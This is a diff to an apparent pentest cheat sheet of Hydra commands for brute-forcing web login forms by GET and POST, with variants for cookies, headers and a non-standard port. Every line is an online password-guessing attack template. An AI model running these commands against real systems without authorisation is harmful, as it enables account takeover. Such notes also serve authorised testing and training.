@@ -7,7 +7,8 @@ hydra -I -V -f -L usernames.txt -u -P /usr/share/seclists/Passwords/xato-net-10-
 hydra -I -V -f -L user.txt -u -P pass.txt <URL> http-get-form "/<login_URL>:username=^USER^&password=^PASS^&Login=Login:<error_message>"
 
 # post
-hydra -I -V -f -L user.txt -u -P pass.txt <URL> http-post-form "/<login_URL>:username=^USER^&password=^PASS^:<error_message>"
+hydra -I -V -f -L user.txt -u -P pass.txt <IP> http-post-form "/<login_URL>:username=^USER^&password=^PASS^:<error_message>"
+hydra -I -V -f -L user.txt -u -P pass.txt -s <NON_80_PORT> <IP> http-post-form "/<login_URL>:username=^USER^&password=^PASS^:<error_message>"
 
 # post cookie and header
 hydra -I -V -f -L user.txt -u -P pass.txt <URL> http-post-form "/<login_URL>:username=^USER^&password=^PASS^:<error_message>:C=/page/cookie:H=X-Foo: Foo"
